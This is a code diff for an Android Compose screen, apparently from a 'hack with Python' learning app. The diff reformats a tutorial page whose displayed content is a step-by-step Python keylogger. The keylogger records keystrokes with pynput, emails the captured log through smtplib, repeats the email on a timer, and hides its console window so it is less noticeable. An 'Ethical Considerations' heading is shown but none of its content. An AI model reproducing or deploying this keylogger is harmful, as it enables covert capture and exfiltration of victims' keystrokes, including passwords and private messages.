@@ -1,16 +1,23 @@
 package com.example.hackwithpython.projects
 
+import androidx.compose.foundation.horizontalScroll
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.rememberScrollState
+import androidx.compose.foundation.text.BasicText
+import androidx.compose.foundation.text.selection.SelectionContainer
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material3.Text
 import androidx.compose.material3.Button
 import androidx.compose.runtime.Composable
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.text.TextStyle
+import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
+import androidx.compose.ui.unit.sp
 import androidx.navigation.NavController
+import com.example.hackwithpython.HackerWhite
 
 @Composable
 fun Project3Screen(navController: NavController) {
@@ -49,8 +56,8 @@ fun Project3Screen(navController: NavController) {
         )
         Text(
             text = """
-                - **pynput**: A library that provides an interface to capture keyboard and mouse input.
-                - **smtplib**: A built-in Python library used to send emails via the Simple Mail Transfer Protocol (SMTP).
+                - pynput: A library that provides an interface to capture keyboard and mouse input.
+                - smtplib: A built-in Python library used to send emails via the Simple Mail Transfer Protocol (SMTP).
             """.trimIndent(),
             modifier = Modifier.padding(vertical = 8.dp)
         )
@@ -64,15 +71,19 @@ fun Project3Screen(navController: NavController) {
         )
         Text(
             text = """
-                1. **Install Required Libraries**:
+                1. Install Required Libraries:
                    Install `pynput` via pip.
                    ```bash
                    pip install pynput
                    ```
 
-                2. **Recording Keystrokes**:
-                   Use `pynput` to capture keystrokes.
-                   ```python
+                2. Recording Keystrokes:
+                """
+                )
+        SelectionContainer {
+            BasicText(
+                text =
+                """
                    from pynput.keyboard import Key, Listener
 
                    log = ""
@@ -94,11 +105,25 @@ fun Project3Screen(navController: NavController) {
 
                    with Listener(on_press=on_press, on_release=on_release) as listener:
                        listener.join()
-                   ```
+                """.trimIndent(),
+                style = TextStyle(
+                    fontFamily = FontFamily.Monospace,
+                    fontSize = 14.sp,
+                    color = HackerWhite
+                ),
+                modifier =Modifier.padding(12.dp)
+                    .horizontalScroll(rememberScrollState())
+            )
+                           }
+            Text(text= """
 
                 3. **Sending Logs via Email**:
                    Use `smtplib` to send the captured keystrokes via email.
-                   ```python
+                   
+                """)
+            SelectionContainer {
+                BasicText(
+                    text = """    
                    import smtplib
                    from email.mime.text import MIMEText
 
@@ -118,11 +143,25 @@ fun Project3Screen(navController: NavController) {
 
                    # Call the function to send the logs after capturing them
                    send_email(log)
-                   ```
+                   """.trimIndent(),
 
+                style = TextStyle(
+                    fontFamily = FontFamily.Monospace,
+                    fontSize = 14.sp,
+                    color = HackerWhite
+                ),
+                modifier =Modifier.padding(12.dp)
+                    .horizontalScroll(rememberScrollState())
+                )
+            }
+            Text ( text = """
                 4. **Automating Email Sending**:
                    Set a timer to automatically send the logs every few minutes.
-                   ```python
+                  """)
+
+            SelectionContainer {
+                BasicText(
+                    text = """
                    import threading
 
                    def send_logs_periodically(log):
@@ -133,20 +172,42 @@ fun Project3Screen(navController: NavController) {
 
                    # Start the timer
                    send_logs_periodically(log)
-                   ```
+                   """.trimIndent(),
 
+                style = TextStyle(
+                    fontFamily = FontFamily.Monospace,
+                    fontSize = 14.sp,
+                    color = HackerWhite
+                ),
+                modifier =Modifier.padding(12.dp)
+                    .horizontalScroll(rememberScrollState())
+                )
+            }
+
+            Text(text= """
                 5. **Hiding the Keylogger Process** (Optional):
                    Hide the keylogger window to make it less noticeable.
-                   ```python
-                   import os
+                   
+                 """)
 
+            SelectionContainer {
+                BasicText(
+                    text = """
+                                           
+                   import os
                    # Hide the console window on Windows
                    os.system("start /b pythonw keylogger.py")
-                   ```
 
             """.trimIndent(),
-            modifier = Modifier.padding(vertical = 8.dp)
-        )
+                style = TextStyle(
+                    fontFamily = FontFamily.Monospace,
+                    fontSize = 14.sp,
+                    color = HackerWhite
+                ),
+                modifier =Modifier.padding(12.dp)
+                    .horizontalScroll(rememberScrollState())
+                )
+            }
 
         // Ethical Considerations Section
         Text(
